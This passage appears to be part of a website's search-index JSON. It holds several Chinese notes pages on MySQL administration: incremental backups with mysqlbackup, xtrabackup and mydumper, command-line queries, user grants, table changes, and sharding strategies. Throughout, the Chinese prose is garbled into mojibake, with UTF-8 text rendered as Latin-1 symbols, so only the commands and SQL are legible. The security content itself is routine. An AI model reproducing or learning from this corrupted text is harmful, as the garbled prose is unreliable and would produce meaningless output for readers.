è¯´æ˜ï¼Œmysqlbackupæ˜¯mysqlä¼ä¸šç‰ˆåŠŸèƒ½ï¼Œoracleå•†ä¸šè½¯ä»¶ï¼Œéœ€è¦ä»˜è´¹ä½¿ç”¨ ä¸‹è½½åœ°å€: https://www.mysql.com/downloads/ å¤‡ä»½ å¤šæ–‡ä»¶å¤‡ä»½æµç¨‹ï¼ˆæ¨èä½¿ç”¨å¤šæ–‡ä»¶çš„ï¼Œå°±æ˜¯æ¢å¤éœ€è¦æ•´ç†æˆå•æ–‡ä»¶ï¼Œæ­¤å¤„å°±ä¸å†™å•æ–‡ä»¶æµç¨‹äº†ï¼ŒåŸºæœ¬ä¸€è‡´ï¼‰ ç¬¬ä¸€æ¬¡å¢é‡å¤‡ä»½: mysqlbackup --defaults-file=$socket_file --user=$user --password --with-timestamp --incremental --incremental-base=dir:$base_bak_dir --incremental-backup-dir=$true_bak_dir backup --incremental è¡¨ç¤ºå¢é‡å¤‡ä»½ --incremental-base åŸºäºå“ªä¸ªå¤‡ä»½çš„å¤‡ä»½ --incremental-backup-dir å¢é‡å¤‡ä»½çš„å¤‡ä»½å­˜æ”¾ç›®å½• ç¬¬äºŒæ¬¡å¢é‡å¤‡ä»½ mysqlbackup --defaults-file=$socket_file --with-timestamp --user=$user --password --incremental --incremental-base=dir:$base_bak_dir --incremental-backup-dir=$true_bak_dir backup æ³¨è§£ ç¬¬äºŒæ¬¡ incremental-base çš„ä½ç½®æ˜¯ç¬¬ä¸€æ¬¡å¢é‡å¤‡ä»½çš„ä½ç½® æ¢å¤å¢é‡å¤‡ä»½ ä½¿ç”¨apply-logå°†å®Œæ•´å¤‡ä»½åšæˆæœ€ç»ˆå¤‡ä»½: mysqlbackup --backup-dir=$res_bak_file apply-log å°†ç¬¬ä¸€æ¬¡å¢é‡å¤‡ä»½å¤‡ä»½å®Œæ•´å¤‡ä»½ä¸­: mysqlbackup --incremental-backup-dir=$first_bak_dir --backup-dir=$res_bak_file apply-incremental-backup å°†ç¬¬äºŒæ¬¡å¢é‡å¤‡ä»½å¤‡ä»½åˆ°å®Œæ•´å¤‡ä»½ä¸­: mysqlbackup --incremental-backup-dir=$second_bak_dir --backup-dir=$res_bak_file apply-incremental-backup ç‰©ç†è¿˜åŸ: mysqlbackup --defaults-file=/etc/mysql/mysql.cond.d/mysqld.cnf --backup-dir=$res_bak_file copy-back æ³¨è§£ apply-incremental-backup æ¯ä¸€ä¸ªå¢é‡å¤‡ä»½åˆ·æ–°æ—¥å¿— æ–¹æ¡ˆä¸‰ï¼šå¼€æºå·¥å…· xtraback å®ç°å¢é‡å¤‡ä»½ xtrabackä¼˜ç‚¹ å¤‡ä»½é€Ÿåº¦å¿«ï¼Œç‰©ç†å¤‡ä»½å¯é  å¤‡ä»½è¿‡ç¨‹ä¸ä¼šæ‰“æ–­æ­£åœ¨æ‰§è¡Œçš„äº‹åŠ¡ï¼ˆæ— éœ€é”è¡¨ï¼‰ èƒ½å¤ŸåŸºäºå‹ç¼©ç­‰åŠŸèƒ½èŠ‚çº¦ç£ç›˜ç©ºé—´å’Œæµé‡ è‡ªåŠ¨å¤‡ä»½æ ¡éªŒ è¿˜åŸé€Ÿåº¦å¿« å¯ä»¥æµä¼ å°†å¤‡ä»½ä¼ è¾“åˆ°å¦å¤–ä¸€å°æœºå™¨ä¸Š åœ¨ä¸å¢åŠ æœåŠ¡å™¨è´Ÿè½½çš„æƒ…å†µå¤‡ä»½æ•°æ® ä¸‹è½½åœ°å€: https://www.percona.com/downloads/XtraBackup/LATEST/ è¯´æ˜ Xtrabackupä¸­ä¸»è¦åŒ…å«ä¸¤ä¸ªå·¥å…·ï¼š xtrabackupï¼šæ˜¯ç”¨äºçƒ­å¤‡innodbï¼Œxtradbè¡¨ä¸­æ•°æ®çš„å·¥å…·ï¼Œä¸èƒ½å¤‡ä»½å…¶ä»–ç±»å‹çš„è¡¨ï¼Œä¹Ÿä¸èƒ½å¤‡ä»½æ•°æ®è¡¨ç»“æ„ï¼› innobackupexï¼šæ˜¯å°†xtrabackupè¿›è¡Œå°è£…çš„perlè„šæœ¬ï¼Œæä¾›äº†å¤‡ä»½myisamè¡¨çš„èƒ½åŠ›ã€‚ å¸¸ç”¨é€‰é¡¹: --host æŒ‡å®šä¸»æœº --user æŒ‡å®šç”¨æˆ·å --password æŒ‡å®šå¯†ç  --port æŒ‡å®šç«¯å£ --databases æŒ‡å®šæ•°æ®åº“ --incremental åˆ›å»ºå¢é‡å¤‡ä»½ --incremental-basedir æŒ‡å®šåŒ…å«å®Œå…¨å¤‡ä»½çš„ç›®å½• --incremental-dir æŒ‡å®šåŒ…å«å¢é‡å¤‡ä»½çš„ç›®å½• --apply-log å¯¹å¤‡ä»½è¿›è¡Œé¢„å¤„ç†æ“ä½œ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåœ¨å¤‡ä»½å®Œæˆåï¼Œæ•°æ®å°šä¸”ä¸èƒ½ç”¨äºæ¢å¤æ“ä½œï¼Œå› ä¸ºå¤‡ä»½çš„æ•°æ®ä¸­å¯èƒ½ä¼šåŒ…å«å°šæœªæäº¤çš„äº‹åŠ¡æˆ–å·²ç»æäº¤ä½†å°šæœªåŒæ­¥è‡³æ•°æ®æ–‡ä»¶ä¸­çš„äº‹åŠ¡ã€‚å› æ­¤ï¼Œæ­¤æ—¶æ•°æ®æ–‡ä»¶ä»å¤„ç†ä¸ä¸€è‡´çŠ¶æ€ã€‚\"å‡†å¤‡\"çš„ä¸»è¦ä½œç”¨æ­£æ˜¯é€šè¿‡å›æ»šæœªæäº¤çš„äº‹åŠ¡åŠåŒæ­¥å·²ç»æäº¤çš„äº‹åŠ¡è‡³æ•°æ®æ–‡ä»¶ä¹Ÿä½¿å¾—æ•°æ®æ–‡ä»¶å¤„äºä¸€è‡´æ€§çŠ¶æ€ã€‚ --redo-only ä¸å›æ»šæœªæäº¤äº‹åŠ¡ --copy-back æ¢å¤å¤‡ä»½ç›®å½• å¢é‡å¤‡ä»½, åŸºäºå…¨é‡å¤‡ä»½çš„å¢é‡å¤‡ä»½ä¸æ¢å¤ åšä¸€æ¬¡å¢é‡å¤‡ä»½ï¼ˆåŸºäºå½“å‰æœ€æ–°çš„å…¨é‡å¤‡ä»½ï¼‰: innobackupex --user=$user --password=$password --defaults-file=$mysqld_cnf_file --incremental /backups/ --incremental-basedir=$whole_bak_dir å‡†å¤‡åŸºäºå…¨é‡: innobackupex --user=$user --password=$password --defaults-file=$mysqld_cnf_file --apply-log --redo-only $whole_bak_dir å‡†å¤‡åŸºäºå¢é‡: innobackupex --user=$user --password=$password --defaults-file=$mysqld_cnf_file --apply-log --redo-only $whole_bak_dir --incremental-dir=$increase_dir å¢é‡å¤‡ä»½æ¢å¤: innobackupex --copy-back --defaults-file=$mysqld_cnf_file $bak_dir è§£é‡Š: $whole_bak_dir æŒ‡çš„æ˜¯å®Œå…¨å¤‡ä»½æ‰€åœ¨çš„ç›®å½•ã€‚ $increase_dir æŒ‡å®šæ˜¯ç¬¬ä¸€æ¬¡åŸºäº $whole_bak_dir å¢é‡å¤‡ä»½çš„ç›®å½•ï¼Œ å…¶ä»–ç±»ä¼¼ä»¥æ­¤ç±»æ¨ï¼Œå³å¦‚æœæœ‰å¤šæ¬¡å¢é‡å¤‡ä»½ã€‚æ¯ä¸€æ¬¡éƒ½è¦æ‰§è¡Œå¦‚ä¸Šæ“ä½œã€‚ æ³¨è§£ å¢é‡å¤‡ä»½ä»…èƒ½åº”ç”¨äºInnoDBæˆ–XtraDBè¡¨ï¼Œå¯¹äºMyISAMè¡¨è€Œè¨€ï¼Œæ‰§è¡Œå¢é‡å¤‡ä»½æ—¶å…¶å®è¿›è¡Œçš„æ˜¯å®Œå…¨å¤‡ä»½ã€‚ æ­¤èŠ‚å‚è€ƒ: xtrabackupçš„é…ç½®ä½¿ç”¨ å…¶ä»–å·¥å…·-MyDumper ç›¸å¯¹äº MySQL å®˜æ–¹æä¾›çš„é€»è¾‘å¤‡ä»½å·¥å…· mysqldump, mydumper æœ€çªå‡ºçš„ç‰¹æ€§å°±æ˜¯å¯é‡‡ç”¨å¤šçº¿ç¨‹å¹¶è¡Œå¤‡ä»½ï¼Œæå¤§æé«˜äº†æ•°æ®å¯¼å‡ºçš„é€Ÿåº¦ã€‚ ä½¿ç”¨: mydumper -h $host -u $user -p $password --database $db --tables-lists $tables --compress --threads 4 --outputdir $path # å°‘ä¸€ä¸ª --tables-lists $tables å°±æ˜¯å…¨åº“å¤‡ä»½ mydumper -h $host --database $db --compress --threads 4 --outputdir $path --defaults-file=$passfile -c , --compress å‹ç¼©è¾“å‡ºæ–‡ä»¶ -m , --no-schemas ä¸å¯¼å‡ºè¡¨ç»“æ„ -t , --threads ä½¿ç”¨çš„çº¿ç¨‹æ•°é‡ -F , --chunk-filesize å°†è¡¨æ•°æ®åˆ†å‰²æˆè¿™ä¸ªè¾“å‡ºå¤§å°çš„å—ï¼Œå•ä½é»˜è®¤æ˜¯MB","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-MySQL-backup-solution.html","loc":"/yq-doc-source-docs-database-mysql-MySQL-backup-solution.html"},{"title":"æŸ¥è¯¢é€‰é¡¹","text":"union å»é‡æŸ¥è¯¢ union all ä¸å»é‡æŸ¥è¯¢ distinct å­—æ®µå»é‡ éäº¤äº’å¼æŸ¥è¯¢ å‘½ä»¤è¡Œç›´æ¥æŸ¥è¯¢: # å¦‚æœæ˜¯æ–‡ä»¶ mysql -u $user -p $pass < $file.sql # ä¸æ˜¯æ–‡ä»¶ echo \"$sql\" | mysql -u $user -p$pass å¦‚æœæŠŠè´¦å·å¯†ç æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶: # pwd.cnf [client] user=root password=root å‘½ä»¤è¡Œç›´æ¥æŸ¥è¯¢: # å¦‚æœæ˜¯sqlè¯­å¥æ–‡ä»¶ mysql --defaults-extra-file=pwd.cnf < $file.sql # å¦‚æœä¸æ˜¯ echo \"$sql\" | mysql --defaults-extra-file=pwd.cnf ç©ºé—´å ç”¨æŸ¥è¯¢ æŸ¥è¯¢æ‰€å ç©ºé—´: select table_schema as 'æ•°æ®åº“', sum(table_rows) as 'è®°å½•æ•°', sum(truncate(data_length/1024/1024, 2)) as 'æ•°æ®å®¹é‡(MB)', sum(truncate(index_length/1024/1024, 2)) as 'ç´¢å¼•å®¹é‡(MB)' from information_schema.tables where table_schema='mysql'; ä½¿ç”¨optimizeå‘½ä»¤æŸ¥è¯¢ç©ºé—´å ç”¨: optimize table tb_report_inventory; æ³¨è§£ ä½¿ç”¨çš„æ—¶é—´æ¯”è¾ƒé•¿ï¼Œéœ€è¦è€å¿ƒç­‰å¾…ã€‚ optimizeæ‰§è¡Œæ—¶ä¼šå°†è¡¨é”ä½ï¼Œæ‰€ä»¥ä¸è¦åœ¨é«˜å³°æœŸä½¿ç”¨ã€‚ä¹Ÿä¸è¦ç»å¸¸ä½¿ç”¨ï¼Œæ¯æœˆä¸€æ¬¡å°±è¶³å¤Ÿäº† æŸ¥è¯¢æ•°æ®åº“è¿æ¥ SQL: show processlist; æ˜¾ç¤ºå½“å‰æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹æˆ–ä¼šè¯çš„åˆ—è¡¨ä»¥åŠä¸æ¯ä¸ªè¿›ç¨‹ç›¸å…³çš„ä¸€äº›ä¿¡æ¯. ä¼šè¿”å›ä¸€ä¸ªç»“æœé›†ï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š Id è¡¨ç¤ºè¿æ¥çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚ User è¡¨ç¤ºè¿æ¥ä½¿ç”¨çš„æ•°æ®åº“ç”¨æˆ·ã€‚ Host è¡¨ç¤ºè¿æ¥çš„ä¸»æœºåæˆ– IP åœ°å€ã€‚ db è¡¨ç¤ºè¿æ¥å½“å‰æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“ã€‚ Command è¡¨ç¤ºè¿æ¥æ­£åœ¨æ‰§è¡Œçš„ SQL å‘½ä»¤ç±»å‹ï¼Œå¦‚ Queryã€Sleepã€Binlog Dump ç­‰ã€‚ Time è¡¨ç¤ºè¿æ¥å·²ç»æ‰§è¡Œçš„æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚ State è¡¨ç¤ºè¿æ¥çš„å½“å‰çŠ¶æ€ï¼Œå¦‚ Runningã€Lockedã€Sending data ç­‰ã€‚ Info è¡¨ç¤ºè¿æ¥å½“å‰æ­£åœ¨æ‰§è¡Œçš„ SQL è¯­å¥æˆ–æ“ä½œçš„æè¿°ã€‚ ç›‘è§†æ•°æ®åº“è¿æ¥å’Œè¯†åˆ«æ½œåœ¨é—®é¢˜éå¸¸æœ‰ç”¨ mysql8.0ä¸‹å®é™…ä½¿ç”¨è®°å½• åˆ›å»ºç”¨æˆ·: create user 'username'@'%' identified by 'password'; username ç”¨æˆ·å % ä¸»æœºåï¼Œæœ¬æœºå¯ç”¨localhostï¼Œ%è¡¨ç¤ºæ‰€æœ‰ï¼ˆé€šé…ç¬¦ï¼‰ æŸ¥çœ‹ç”¨æˆ·æƒé™: show grants for username@localhost; ä¸ºusername@localhostèµ‹äºˆè¶…çº§ç”¨æˆ·æƒé™: grant all privileges on *.* to username@localhost with grant option; grant æˆæƒ all privileges æ‰€æœ‰æƒé™ on *.* æ‰€æœ‰æ•°æ®åº“ï¼Œæ‰€æœ‰è¡¨ to username@localhost å“ªä¸ªç”¨æˆ·çš„å“ªä¸ªä¸»æœº with grant option æ˜¯å¦å°†usernameè‡ªèº«çš„æƒé™èµ‹äºˆå…¶ä»–è´¦æˆ· æ™®é€šç”¨æˆ·æƒé™æ·»åŠ : grant usage,select,insert,update,delete,create temporary tables,execute on jikedb.* to username@localhost; //æ­¤æ—¶æ²¡æœ‰with grant option è¡¨ç¤ºä¸ç»™å…¶ä»–ç”¨æˆ·èµ‹æƒé™ flush privileges; usage:æ— æƒé™ï¼Œå½“ä½ æƒ³åˆ›å»ºä¸€ä¸ªæ²¡æœ‰æƒé™çš„ç”¨æˆ·æ—¶å€™ï¼ŒæŒ‡å®šusage show:çš„æƒé™ view:è§†å›¾çš„æƒé™(mysql8.0+èµ‹æƒé™å‡ºé”™)ERROR 3619 (HY000): Illegal privilege level specified for VIEW create temporary tables:åˆ›å»ºä¸´æ—¶è¡¨çš„æƒé™ excuteï¼šæ‰§è¡Œçš„æƒé™ æ”¶å›æƒé™: revoke delete on jikedb.* from username@localhost; # æ„æ€æ˜¯æ”¶å›username@localhostä¸‹jikedbåº“æ‰€æœ‰çš„è¡¨çš„åˆ é™¤æ“ä½œ æ–°åˆ›å»ºçš„ç”¨æˆ·username@localhost è¦æƒ³ä½¿ç”¨ï¼Œç™»å½•åéœ€è¦ä¿®æ”¹å¯†ç : alter user username@localhost identified by '12345678' åˆ é™¤ç”¨æˆ·: drop user username@localhost; //usernameï¼ŒlocalhoståŠ ä¸åŠ å¼•å·éƒ½å¯ æœ‰æ—¶å€™éœ€è¦é‡è½½ä¸€ä¸‹è¡¨æ•°æ®: grant reload on *.* to username@'%'; å®é™…ä½¿ç”¨2-è¡¨çš„åˆ›å»ºä¿®æ”¹ åˆ›å»ºt1è¡¨: mysql> create table t1(id int primary key, name varchar(255), age int); Query OK, 0 rows affected (0.03 sec) æŸ¥çœ‹åˆ›å»ºè¯­å¥: mysql> show create table t1 \\G; *************************** 1. row *************************** Table: t1 Create Table: CREATE TABLE `t1` ( `id` int NOT NULL, `name` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci 1 row in set (0.00 sec) ERROR: No query specified ä¿®æ”¹è¡¨, å¢åŠ ä¸€ä¸ªbirthå­—æ®µ: mysql> alter table t1 add birth datetime; Query OK, 0 rows affected (0.03 sec) Records: 0 Duplicates: 0 Warnings: 0 æŸ¥çœ‹: mysql> show create table t1 \\G; *************************** 1. row *************************** Table: t1 Create Table: CREATE TABLE `t1` ( `id` int NOT NULL, `name` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL, `birth` datetime DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci 1 row in set (0.00 sec) ERROR: No query specified å…¶ä»– select into å†™å…¥æ–‡ä»¶ å¸¸ç”¨è¯­å¥(æœ‰äº›ä¸Šé¢æœ‰äº†): select now() æŸ¥çœ‹å½“å‰æ—¶é—´ database() æŸ¥çœ‹å½“å‰æ•°æ®åº“ version() æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ user() æŸ¥çœ‹å½“å‰ç™»å½•çš„æ•°æ®åº“ç”¨æˆ· sleep(n) ç¡çœ  n ç§’ substr(a, b, c) å¯¹äºaå­—ç¬¦ä¸²ï¼Œbä½ç½®å¼€å§‹ï¼Œæˆªå–é•¿åº¦cçš„å­—ç¬¦ count() è®¡ç®—æ€»æ•° ascii(a) å­—ç¬¦açš„asciiç  length(a) å­—ç¬¦ä¸²açš„é•¿åº¦ # æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ select version(); # ä½¿ç”¨æŒ‡å®šçš„æ•°æ®åº“ use $database_name; # æŸ¥çœ‹æŒ‡å®šè¡¨ä¿¡æ¯ è¿™ä¸ªå¥½åƒåœ¨8.0æœ‰é—®é¢˜... # show table $table_name # æŸ¥çœ‹æŒ‡å®šè¡¨çš„ç»“æ„ show create table $table_name # æŸ¥çœ‹æŒ‡å®šè¡¨çš„ç´¢å¼• show index from $table_name # åˆ é™¤è¡¨ å¤šä¸ªé€—å·éš”å¼€, drop table å•ä¸ªä¹Ÿå¯ drop tables $table_name; # æŸ¥çœ‹SQLæŸ¥è¯¢è®¡åˆ’ EXPLAIN åŠ æ•°æ®åº“è¯­å¥ # æŸ¥çœ‹å„ç§ä¼˜åŒ–å‚æ•°å¼€å…³ select @@optimizer_switch; # åœ¨ä¼šè¯çº§åˆ«è®¾ç½®æŸ¥è¯¢ä¼˜åŒ–å™¨å¯ä»¥çœ‹åˆ°éšè—ç´¢å¼•, # use_invisible_indexes å¯ä»¥é€šè¿‡ä¸Šé¢çš„ optimizer_switch çœ‹åˆ° set session optimizer_switch=\"use_invisible_indexes=on\"; # å¼€å¯ä¸€ä¸ªäº‹åŠ¡ # begin; # åˆ é™¤å¤–é”®çº¦æŸ DROP FOREIGN KEY <å¤–é”®çº¦æŸå> # æŸ¥çœ‹æ‰€æœ‰è§¦å‘å™¨ show triggers\\G; mysqlå‘½ä»¤: -h host é“¾æ¥åˆ°æŒ‡å®šçš„ä¸»æœº -u user ç”¨æˆ· -p password å¯†ç ","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Query-option.html","loc":"/yq-doc-source-docs-database-mysql-Query-option.html"},{"title":"åˆ†åº“åˆ†è¡¨","text":"å…·ä½“æƒ…å†µå…·ä½“åˆ†æ, åˆç†é€‰æ‹©ç­–ç•¥. æ³¨è§£ è¿˜æœ‰ NewSQL çš„ å•æœº åˆ° åˆ†å¸ƒå¼é›†ç¾¤, ä¸å±äºåˆ†åº“åˆ†è¡¨, è€Œæ˜¯ç›´æ¥å°±å®ç°äº†åˆ†å¸ƒå¼ åˆ†åº“åˆ†è¡¨ç®—æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ä¼˜åŒ–è§£å†³æ–¹æ¡ˆ åˆ†åº“: å°†æ•°æ®åˆ†ç¦»å¤šä¸ªåº“, è§£æ”¾æ•°æ®åº“IOæ€§èƒ½ åˆ†è¡¨: å°†æ•°æ®åˆ†ç¦»å¤šä¸ªè¡¨, çªç ´å•è¡¨æ•°æ®å‹åŠ› æ³¨è§£ è¿™é‡Œæä¸€å¥, è¿˜æœ‰å…¶ä»–ä¼˜åŒ–æ–¹æ¡ˆ, æ¯”å¦‚ä½¿ç”¨ ä¸»ä»æ¶æ„ (binlog) å®ç° è¯»å†™åˆ†ç¦» ä¸šåŠ¡ä»£ç å±‚é¢, è¯»å†™åˆ†ç¦»åªå…³æ³¨è·¯ç”±åˆ°è¯»çš„åº“, è¿˜æ˜¯å†™çš„åº“. åˆ†åº“åˆ†è¡¨æ–¹æ¡ˆ æ•°æ®åˆ†ç‰‡ å¸¸è§ç­–ç•¥ å–æ¨¡åˆ†ç‰‡ã€‚ä¼˜ç‚¹ï¼šæ•°æ®å­˜æ”¾å‡åŒ€ã€‚ç¼ºç‚¹ï¼šæ‰©å®¹éœ€è¦å¤§é‡æ•°æ®è¿ç§»ã€‚ æŒ‰èŒƒå›´åˆ†ç‰‡ã€‚ä¼˜ç‚¹ï¼šæ‰©å®¹ä¸éœ€è¦è¿ç§»æ•°æ®ã€‚ç¼ºç‚¹ï¼šæ•°æ®å­˜æ”¾ä¸å‡åŒ€ï¼Œå®¹æ˜“äº§ç”Ÿæ•°æ®å€¾æ–œ(æ¯”å¦‚æŒ‰æœˆä»½åˆ†, æŸæœˆçš„æ•°æ®è¿‡å¤š, å¦ä¸€æœˆå†…æ•°æ®åˆè¿‡å°‘)ã€‚ é…ç½®è·¯ç”±, æ¯”å¦‚å°†è·¯ç”±é…ç½®ä¿¡æ¯å†™åˆ°è·¯ç”±è¡¨; ç¼ºç‚¹æ˜¯å¾—å¤šæŸ¥è¯¢ä¸€æ¬¡, ä»¥åŠæ•°æ®é‡å¤§æ—¶å€™åˆå›é™·å…¥åˆ†è¡¨å¾ªç¯; æ ¹æ®ä¸šåŠ¡åœºæ™¯ï¼Œçµæ´»å®šåˆ¶åˆ†ç‰‡ç­–ç•¥ã€‚--é¢è¯•é‡ç‚¹ å‚ç›´æ‹†åˆ† å‚ç›´åˆ†ç‰‡ï¼š ä»ä¸šåŠ¡ç»´åº¦åˆ‡åˆ†æ‰©å±•æ•°æ®åº“è¿æ¥æ•° æå‡æ•°æ®åº“IOæ€§èƒ½ æŠŠå•åº“ä¸­çš„ä¸åŒè¡¨åˆ†åˆ°ä¸åŒçš„åº“, å†æ·±å…¥ç‚¹, æŠŠå•è¡¨çš„åˆ—æ‹†åˆ†ç»™å¤šä¸ªè¡¨ æ°´å¹³æ‹†åˆ† æ°´å¹³åˆ†ç‰‡ï¼š ä»æ•°æ®ç»´åº¦åˆ‡åˆ†æ‰©å±•å•è¡¨å¯æ§æ•°æ®é‡ æå‡æ•°æ®åº“æŸ¥è¯¢æ€§èƒ½ æ°´å¹³åˆ†ç‰‡ä»ç†è®ºä¸Šçªç ´äº†å•æœºæ•°æ®é‡å¤„ç†çš„ç“¶é¢ˆï¼Œå¹¶ä¸”æ‰©å±•ç›¸å¯¹è‡ªç”±ï¼Œæ˜¯åˆ†åº“åˆ†è¡¨çš„æ ‡å‡†è§£å†³æ–¹æ¡ˆã€‚ å¦‚ æ¯”å¦‚æŒ‰æ—¥æœŸæ‹†åˆ†(èŒƒå›´åˆ†è¡¨), é‚£åœ¨WEBåº”ç”¨çš„è§’åº¦æ€ä¹ˆæŸ¥? å¯ä»¥æŒ‰ç…§æ—¶é—´, 2021å¹´çš„æŸ¥2021å¹´çš„è¡¨... Hashåˆ†è¡¨ å…¶å®å°±æ˜¯ä¸Šé¢çš„å–æ¨¡ç­–ç•¥. æŸ¥id, idè®¡ç®—hashåå¯¹å¤šå°‘(æ¯”å¦‚æ‹†ä¸º4å¼ è¡¨)å–ä½™, ç„¶åå†³å®šå»å“ªä¸ªè¡¨æŸ¥. ä½†æ˜¯æœ‰ä¸ªç¼ºç‚¹, åç»­å¦‚æœå†æ‹†4ä¸ªè¡¨, åŠ èµ·æ¥ä¸€å…±å…«ä¸ª, ä¹‹å‰çš„é€»è¾‘çš„æ··ä¹±äº†. æ‰€ä»¥è¿˜è¦ä½œæ•°æ®è¿ç§» æ— çƒ­ç‚¹é—®é¢˜, ä½†æ˜¯æ‰©å®¹è¿ç§»éº»çƒ¦. èŒƒå›´åˆ†è¡¨ æ—¶é—´åˆ†è¡¨å°±æ˜¯, æ¯”å¦‚ 1000-2000 wæ•°æ®åœ¨ç¬¬2å¼ è¡¨. å­˜åœ¨çƒ­ç‚¹é—®é¢˜. æ¯”å¦‚åŒæ—¶å¹¶å‘åœ¨æŸä¸€ä¸ªè¡¨. åˆ†åº“åˆ†è¡¨åå¦‚ä½•å®ç°ä¸åœæœºæ‰©å®¹ å®é™…ä¸Šï¼Œä¸åœæœºæ‰©å®¹ï¼Œå®æ“èµ·æ¥æ˜¯ä¸ªéå¸¸éº»çƒ¦è€Œä¸”å¾ˆæœ‰é£é™©çš„æ“ä½œï¼Œ å½“ç„¶ï¼Œé¢è¯•å›ç­”èµ·æ¥å°±ç®€å•å¾ˆå¤šã€‚ ç¬¬ä¸€é˜¶æ®µï¼šåœ¨çº¿åŒå†™ï¼ŒæŸ¥è¯¢èµ°è€åº“ å»ºç«‹å¥½æ–°çš„åº“è¡¨ç»“æ„ï¼Œæ•°æ®å†™å…¥è€åº“çš„åŒæ—¶ï¼Œä¹Ÿå†™å…¥æ‹†åˆ†çš„æ–°åº“ æ•°æ®è¿ç§»ï¼Œä½¿ç”¨æ•°æ®è¿ç§»ç¨‹åºï¼Œå°†æ—§åº“ä¸­çš„å†å²æ•°æ®è¿ç§»åˆ°æ–°åº“ ä½¿ç”¨å®šæ—¶ä»»åŠ¡ï¼Œæ–°æ—§åº“çš„æ•°æ®å¯¹æ¯”ï¼ŒæŠŠå·®å¼‚è¡¥é½ ç¬¬äºŒé˜¶æ®µï¼šåœ¨çº¿åŒå†™ï¼ŒæŸ¥è¯¢èµ°æ–°åº“ å®Œæˆäº†å†å²æ•°æ®çš„åŒæ­¥å’Œæ ¡éªŒ æŠŠå¯¹æ•°æ®çš„è¯»åˆ‡æ¢åˆ°æ–°åº“ ç¬¬ä¸‰é˜¶æ®µï¼šæ—§åº“ä¸‹çº¿ æ—§åº“ä¸å†å†™å…¥æ–°çš„æ•°æ® ç»è¿‡ä¸€æ®µæ—¶é—´ï¼Œç¡®å®šæ—§åº“æ²¡æœ‰è¯·æ±‚ä¹‹åï¼Œå°±å¯ä»¥ä¸‹çº¿è€åº“ åˆ†åº“åˆ†è¡¨é—®é¢˜ ä»åˆ†åº“çš„è§’åº¦æ¥è®² äº‹åŠ¡çš„é—®é¢˜ ä½¿ç”¨å…³ç³»å‹æ•°æ®åº“ï¼Œå›å¾ˆå¤§ä¸€ç‚¹åœ¨äºå®ƒä¿è¯äº‹åŠ¡å®Œæ•´æ€§ã€‚ è€Œåˆ†åº“ä¹‹åå•æœºäº‹åŠ¡å°±ç”¨ä¸ä¸Šäº†ï¼Œå¿…é¡»ä½¿ç”¨åˆ†å¸ƒå¼äº‹åŠ¡æ¥è§£å†³ã€‚ è·¨åº“ JOIN é—®é¢˜ åœ¨ä¸€ä¸ªåº“ä¸­çš„æ—¶å€™æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨JOIN æ¥è¿è¡¨æŸ¥è¯¢ï¼Œè€Œè·¨åº“äº†ä¹‹åå°±æ— æ³•ä½¿ç”¨JOIN äº† æ­¤æ—¶çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨ä¸šåŠ¡ä»£ç ä¸­è¿›è¡Œå…³è”ï¼Œä¹Ÿå°±æ˜¯å…ˆæŠŠä¸€ä¸ªè¡¨çš„æ•°æ®æŸ¥å‡ºæ¥ï¼Œ ç„¶åé€šè¿‡å¾—åˆ°çš„ç»“æœå†å»æŸ¥å¦ä¸€å¼ è¡¨ï¼Œç„¶ååˆ©ç”¨ä»£ç æ¥å…³è”å¾—åˆ°æœ€ç»ˆçš„ç»“æœã€‚ è¿™ç§æ–¹å¼å®ç°èµ·æ¥ç¨å¾®æ¯”è¾ƒå¤æ‚ï¼Œä¸è¿‡ä¹Ÿæ˜¯å¯ä»¥æ¥å—çš„ã€‚ è¿˜æœ‰å¯ä»¥é€‚å½“çš„å†—ä½™ä¸€äº›å­—æ®µã€‚æ¯”å¦‚ä»¥å‰çš„è¡¨å°±å­˜å‚¨ä¸€ä¸ªå…³è” IDï¼Œä½†æ˜¯ä¸šåŠ¡æ—¶å¸¸è¦æ±‚è¿”å›å¯¹åº”çš„ Name æˆ–è€…å…¶ä»–å­—æ®µã€‚ è¿™æ—¶å€™å°±å¯ä»¥æŠŠè¿™äº›å­—æ®µå†—ä½™åˆ°å½“å‰è¡¨ä¸­ï¼Œæ¥å»é™¤éœ€è¦å…³è”çš„æ“ä½œã€‚ è¿˜æœ‰ä¸€ç§æ–¹å¼å°±æ˜¯æ•°æ®å¼‚æ„ï¼Œé€šè¿‡binlogåŒæ­¥ç­‰æ–¹å¼ï¼ŒæŠŠéœ€è¦è·¨åº“joinçš„æ•°æ®åŒæ­¥åˆ°ESçš„å¤§å®½è¡¨é‡Œå»ï¼Œé€šè¿‡ESç›´æ¥æŸ¥è¯¢ï¼Œæ•ˆç‡å¾ˆé«˜ã€‚ ä»åˆ†è¡¨çš„è§’åº¦æ¥çœ‹ è·¨èŠ‚ç‚¹çš„ count,order by.group by ä»¥åŠèšåˆå‡½æ•°é—®é¢˜ åªèƒ½ç”±ä¸šåŠ¡ä»£ç æ¥å®ç°æˆ–è€…ç”¨ä¸­é—´ä»¶å°†å„è¡¨ä¸­çš„æ•°æ®æ±‡æ€»ã€æ’åºã€åˆ†é¡µç„¶åè¿”å›ã€‚ æ•°æ®è¿ç§»ï¼Œå®¹é‡è§„åˆ’ï¼Œæ‰©å®¹ç­‰é—®é¢˜ 